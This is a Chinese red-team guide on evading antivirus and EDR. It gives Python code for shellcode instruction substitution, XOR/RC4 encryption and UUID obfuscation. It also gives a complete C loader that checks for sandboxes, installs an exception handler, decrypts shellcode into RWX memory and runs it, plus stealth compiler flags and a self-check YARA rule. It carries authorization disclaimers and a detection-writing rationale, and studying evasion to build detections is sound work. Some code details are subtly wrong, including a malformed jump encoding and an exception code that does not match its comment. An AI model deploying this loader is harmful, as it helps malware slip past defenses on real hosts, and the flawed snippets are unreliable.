# 免杀管线：Shellcode 处理与 Loader 编写

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/pe-reverse/techniques/09-av-evasion/01-ai-powered-evasion.md`（已适配本机工具链）
> **什么时候用**：**在已授权的渗透测试 / 红队评估环境里**，需要让一个检测payload 在目标主机上落地执行而不被主机上的 EDR/杀软当场拦下。
>
> ⚠️ **适用边界（务必先读）**
> 本篇只适用于**你拥有或已获得书面授权的目标主机**。使用本篇技术去规避
> 你不拥有、未获授权的第三方系统的防护措施，在中国大陆属于破坏计算机信息系统罪
> （刑法 285/286 条），在多数司法辖区同样违法。**「授权测试」和「未授权免杀」的
> 法律边界不是程度问题，是有无问题。**
>
> **对本机技能包的价值定位**：本篇在 `relab2` 的语境下，主要用途是**对抗分析** ——
> 也就是当你在红队评估中**自建检测规则**时，需要知道攻击者的规避手段长什么样，
> 才能写出能覆盖它的规则（见 `yara-rule-writing.md`）。这是防御视角的正当用途。

## 适用信号

- **红队自检**：刚生成的 payload 被自家 EDR 拦下，需要理解拦截点在哪。
- **蓝队规则验证**：写完 YARA/EDR 规则后，需要一个「能绕过它」的样本做验证。
- **授权测试**：目标主机已签授权书，明确允许绕过其防护。

**不适用**：任何未授权的第三方目标。

## 前置

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$gcc = 'D:\Tools\runtime\mingw64\bin\gcc.exe'   # 本机 gcc 15.2.0
$py  = 'D:\EXE\python\python.exe'
$die = (Resolve-ReverseToolSpec -Name 'diec').Command
$capa = (Resolve-ReverseToolSpec -Name 'capa').Command
$pe   = 'D:\Tools\pe-sieve\pe-sieve64.exe'
```

★ **本机 gcc 可用，MSVC 不可用**。编译命令用 MinGW 形态。

## 步骤

### 0. 先建立基线：不做任何处理，测一遍

**跳过这一步的免杀都是盲改。** 必须知道 payload 原始状态下被什么规则命中。

```powershell
$die = (Resolve-ReverseToolSpec -Name 'diec').Command
$hash = [System.BitConverter]::ToString(
    [System.Security.Cryptography.SHA256]::Create().ComputeHash(
        [IO.File]::ReadAllBytes('.\payload.bin'))).Replace('-','').ToLower()
Write-Host "sha256 = $hash"

& $die -j .\payload.bin          # 壳/编译器识别
& $capa .\payload.bin             # 能力映射，看命中哪些 ATT&CK 规则
```

★ **`Get-FileHash` 在某些受限上下文不可用** —— 用上面的 .NET `SHA256` 写法，
或 `certutil -hashfile .\payload.bin SHA256`。见 `aob-signature-scan.md` 的同类处理。

★ **capa 的官方 exe 在本机被 Defender 误报隔离过**，用探测层给的
`D:\Tools\capa\capa.bat`（PyPI 版）。但注意 PyPI 版可能缺内嵌规则集，
输出为空时先确认规则库是否完整，别直接下「没命中」的结论。

### 1. 管线全貌

```
原始 shellcode ──→ [1] Patch ──→ [2] Encrypt ──→ [3] Obfuscate ──→ [4] Loader ──→ .exe
                     │               │               │                  │
                  同义指令替换    XOR/RC4/S-Box    UUID/IPv4 伪装    VEH 异常处理
                  花指令         多层加密          分块存储         Direct Syscall
                  指令重排        动态密钥          动态拼接          反沙箱检测
```

★ **每一步都要单独测**。一次改完再测，你不知道是哪一步起了作用（或是哪一步引入了新特征）。

### 2. [1] Patch：同义指令替换

把命中检测特征的指令换成等价但字节不同的形式：

```python
# 等价替换表（x64）
EQUIV = [
    (b"\x90\x90\x90\x90\x90\x90",      # nop*6
     b"\x0f\x1f\x44\x00\x00" + b"\x90"),   # nop word*2 + nop（语义等价，字节不同）
    (b"\x31\xc0",                       # xor eax, eax
     b"\x33\xc0"),                      # 同样清零，异或源不同
    (b"\x48\x83\xc4\x28",               # add rsp, 0x28
     b"\x48\x81\xc4\x28\x00\x00\x00"),  # add rsp, imm32 形式
    (b"\x74\x05",                       # jz +5
     b"\x0f\x84\x00\x00\x00\x00\x05"),  # jz rel32 形式
]
```

★ **替换后必须验证语义等价**。用 `disasm-jit-asm.md` 的 capstone 回环：
替换前后反汇编出来要做同一件事。**不验证就会引入真 bug**（比如把条件跳转的
目标算错 —— 短跳和近跳的偏移基准不一样）。

### 3. [2] Encrypt：多层加密

```python
def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def rc4_encrypt(data: bytes, key: bytes) -> bytes:
    S = list(range(256)); j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    out = bytearray(); i = j = 0
    for b in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(b ^ S[(S[i] + S[j]) % 256])
    return bytes(out)

def sbox_encrypt(data: bytes, sbox: bytes) -> bytes:
    return bytes(sbox[b] ^ sbox[i % len(sbox)] for i, b in enumerate(data))
```

Loader 侧对应的解密：

```c
static void xor_decrypt(unsigned char* d, size_t n, unsigned char* k, size_t kn) {
    for (size_t i = 0; i < n; i++) d[i] ^= k[i % kn];
}
```

★ **每次编译用不同的随机密钥** —— 这是「每次 hash 不同」的关键。
固定密钥 = 固定特征 = 一次 YARA 规则永久覆盖。

### 4. [3] Obfuscate：把字节拆成看起来无害的常量

```c
#include <rpc.h>
#pragma comment(lib, "rpcrt4.lib")

static void uuid_deobfuscate(const char** uuids, size_t count,
                             unsigned char* out, size_t out_len) {
    size_t off = 0;
    for (size_t i = 0; i < count && off < out_len; i++) {
        UUID u;
        if (UuidFromStringA((RPC_CSTR)uuids[i], &u) != RPC_S_OK) continue;
        size_t n = 16;
        if (off + n > out_len) n = out_len - off;
        memcpy(out + off, &u, n);
        off += n;
    }
}
```

原理：UUID 是 16 字节的值，`memcpy` 后按小端排列。拆成 `"{........-....-....-....-............}"`
形态的字符串后，静态扫描器看到的是一堆看似随机的 GUID，不像 shellcode。

其他常用形态：
- **IPv4 编码**：4 字节一个整数 → `"192.168.x.x"` 字符串。
- **整数数组**：`DWORD[]` 常量数组，每 4 字节拼一个。
- **分块存储**：把 shellcode 切成 N 段，散落在数组的不同位置，运行时拼接。

★ **注意：这些手法都是公开的、有大量现成检测规则的。** obfuscate 提高的是
**静态扫描的门槛**，不是让 payload 无法被检测。动态执行的行为检测
（EDR 的 syscall 监控、内存扫描）照常能看见。

### 5. [4] Loader：运行时解密 + 执行

```c
#include <windows.h>

static DWORD get_syscall_number(const char* name) {
    /* ★ 从本机 ntdll 动态提取，绝不硬编码。
       完整可靠的实现见 direct-syscall.md 步骤 2（用 pefile 或运行时读 stub）。 */
    HMODULE n = GetModuleHandleA("ntdll.dll");
    if (!n) return 0;
    BYTE* f = (BYTE*)GetProcAddress(n, name);
    if (!f || f[0] != 0x4C || f[1] != 0x8B || f[2] != 0xD1) return 0;
    return *(DWORD*)(f + 4);
}

static BOOL anti_sandbox_check(void) {
    /* 反沙箱：内存/CPU/沙箱文件/沙箱 DLL 探测 */
    MEMORYSTATUSEX mem = { .dwLength = sizeof(mem) };
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return TRUE;  /* <2GB */

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors <= 1) return TRUE;

    const char* dlls[] = { "sbiedll.dll", "vmcheck.dll", "wpespy.dll", NULL };
    for (int i = 0; dlls[i]; i++)
        if (GetModuleHandleA(dlls[i])) return TRUE;
    return FALSE;
}

static LONG WINAPI veh_handler(PEXCEPTION_POINTERS ex) {
    PEXCEPTION_RECORD rec = ex->ExceptionRecord;
    if (rec->ExceptionCode == EXCEPTION_ILLEGAL_INSTRUCTION) {
        ex->ContextRecord->Rip++;      /* 跳过被插入的 int3 */
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

int main(void) {
    if (anti_sandbox_check()) return 0;
    AddVectoredExceptionHandler(1, veh_handler);

    unsigned char payload[] = { /* 由脚本生成 */ 0x00 };
    const size_t payload_len = sizeof(payload);
    unsigned char key[] = { /* 每次不同 */ 0x00 };

    xor_decrypt(payload, payload_len, key, sizeof(key));

    void* exec = VirtualAlloc(NULL, payload_len,
                              MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec, payload, payload_len);

    HANDLE th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
    WaitForSingleObject(th, INFINITE);
    CloseHandle(th);
    return 0;
}
```

★ **payload 必须用动态密钥**。`unsigned char key[] = {0xAB}` 写死在代码里
= 一个字节特征就够定位。

★ **`VirtualAlloc` 用 `PAGE_EXECUTE_READWRITE` 会触发现代 EDR 的告警**

| 选项 | 作用 |
|---|---|
| `-mwindows` | 无控制台窗口 |
| `-O2` | 优化（会打乱字节序列，降低可预测性） |
| `-static` | 静态链接 CRT，减少 DLL 依赖 |
| `-s` | Strip 符号表 |
| `-fno-ident` | 去掉 `.comment` 段的编译器标识 |

★ **`-static` 很重要**：动态链接的 loader 会加载 `libgcc_s_*.dll`，
而这个文件名本身就是特征，也增加依赖失败的失败面。

★ **`-fno-ident` 能去掉 `.comment` 段里的 GCC 版本字符串** ——
那是一个免费的版本指纹，检测方很喜欢它。

### 7. 自检（这是本篇最有价值的部分）

```powershell
# 1. hash 每次都不同
$sha = [System.Security.Cryptography.SHA256]::Create()
1..3 | ForEach-Object {
    & 'D:\Tools\runtime\mingw64\bin\gcc.exe' -O2 -o "t$_.exe" loader.c -mwindows -static -s -fno-ident
    [BitConverter]::ToString($sha.ComputeHash([IO.File]::ReadAllBytes("t$_.exe"))).Replace('-','').Substring(0,16)
}
```

★★ **「hash 每次不同」不能证明密钥随机 —— 本机实测 gcc 会骗你。**
用**固定密钥**的源码连续编译三次，实测 SHA256 三次都不同：
```
8a0eba55654886a1113f96e78903de4d15375485103404172e08dcebdf67bc3f
0fcbd255080d763dd7de1d1065b091f4c34e4845dc63e81d9b86dee448c11099
146644ca7fb141618d84693dd1c5b9bf98077a419ca39a71c1863b23a832c281
```
原因是 gcc 默认在 PE 里嵌入构建标识（时间戳性质）。**所以这个检查只能证明
「构建不可复现」，不能证明「密钥在变」。**

**真正的判据**：直接检查解密密钥本身是否每次不同 ——
在 loader 里加一行把 `sizeof(key)` 和 `key[0]` 打印出来，或在构建脚本里
把密钥生成到一个单独文件并记录它的 SHA256。**密钥不变 = payload 对任何
针对密钥字节的检测都是透明的**，哪怕文件 hash 每次都不同。

```powershell
# 2. 自己写 YARA 规则抓自己
$yara = (Resolve-ReverseToolSpec -Name 'yara').Command
& $yara .\selfcheck.yar .\loader.exe
```

**自检 YARA 要包含的攻击面**（你绕过的东西就是这些）：

```yara
rule loader_selfcheck {
    meta:
        description = "自检：本次 loader 用到的规避技术"
    strings:
        $rsrcdll = "uuid" ascii nocase
        $anti1 = "sbiedll" ascii nocase
        $anti2 = "vmcheck" ascii nocase
        $capa_susp = { 90 90 90 90 90 90 33 C0 48 83 C4 28 }
    condition:
        uint16(0) == 0x5A4D and 2 of them
}
```

★ **把自己当靶子打一遍**。这是红队自检里最有效的单步动作 ——
你在 payload 里用什么手法，就一定能写出抓它的规则。
写不出来的规则说明你的检测有盲区。

## 判据

1. ★★ **解密密钥本身每次不同**（不是文件 hash）。判据形态：构建脚本记录的密钥 SHA256 逐次不同。
   **文件 hash 逐次不同但密钥固定 = 这个检查没通过**（本机 gcc 会嵌构建标识，
   固定密钥的三次编译也给出三个不同 hash，见步骤 7）。
2. ★★ **每一步的改进都被单独验证过**。判据形态：每次只改一层 → 重新 hash + 重新测
   杀软 → 记录结果。**一次改完再测 = 不知道哪一步起作用，也不知道哪一步引入了新特征。**
3. ★ **自检 YARA 能抓到自己的 payload**。判据形态：`yara selfcheck.yar loader.exe`
   输出 `loader_selfcheck <file>`。**抓不到 = 你的检测规则有盲区**，补规则。
4. **目标环境实机验证**：在**授权的**测试机上确认 payload 落地执行并回调。
   判据形态：C2/回调端收到会话。**这一步只能在授权环境做。**
5. **`diec`/`capa` 的输出可解释**。判据形态：`diec` 不再报可疑壳、
   `capa` 的能力列表里不再有你刻意规避的那几项。**若 capa 输出为空，
   先确认规则库完整，别直接下结论。**

## 坑

1. ★★★ **密钥写死 = payload 对密钥特征检测完全透明**。
   `unsigned char key[] = {0xAB}` 这种写法，一个字节特征就定位全部 loader。
   **但文件 hash 每次不同不代表密钥在变** —— 本机实测 gcc 会在 PE 里嵌入构建标识，
   固定密钥的源码连续编译三次、三个不同 hash（见步骤 7）。
   **必须直接检查密钥本身是否每次不同。**
2. ★★★ **每一步必须单独验证**。合并改完再测，你无法归因。
   而且某一步（比如 obfuscate）可能**引入**新的统计特征（异常长的 GUID 数组）。
3. ★★★ **这不是「无法检测」**。obfuscate 只提高静态扫描门槛。
   **动态行为检测（syscall 监控、RWX 内存扫描、父子进程关系）照常有效。**
   本篇的正当价值是让蓝队知道这些手法存在并写规则覆盖，不是让攻击无孔不入。
4. ★★ **`PAGE_EXECUTE_READWRITE` 是 EDR 的强信号**。
   用 `PAGE_READWRITE` 分配 → 写入 → `NtProtectVirtualMemory` 改 `PAGE_EXECUTE_READ`。
5. ★★ **不要硬编码 syscall 号**。每次 Windows 更新都可能变。见 `direct-syscall.md` 坑 1。
6. ★ **`.comment` 段暴露编译器版本**。用 `-fno-ident` 或 `-s`。
7. **动态链接的 loader 有 DLL 依赖面**。`-static` 减少面。
8. **`-O0` 保留调试友好但特征多**；`-O2` 打乱字节但可能引入编译器特有的序列。
   两种都要自检。
9. **capa 的官方 exe 在本机被 Defender 误报隔离**，PyPI 版可能缺规则集。
   输出为空先查规则库。
10. **`Get-FileHash` 在受限上下文不可用**，用 .NET `SHA256` 或 `certutil`。
11. **UUID deobfuscation 依赖 `rpcrt4.lib`**，gcc 需要 `-lrpcrt4`。
    忘了链接会编译失败。

## 相关

- `yara-rule-writing.md` — **本篇最重要的下游**：把这里的手法写成检测规则
- `direct-syscall.md` — loader 里的 syscall 提取与调用
- `pe-header-parsing.md` — 检查生成的 PE 结构是否正常
- `aob-signature-scan.md` — 对自己的 payload 做特征自检
- `manual-map-injection.md` — 另一种「让 DLL 不进模块列表」的技术
- `anti-debug-bypass.md` — 对抗分析侧（不是对抗 AV）的绕过手段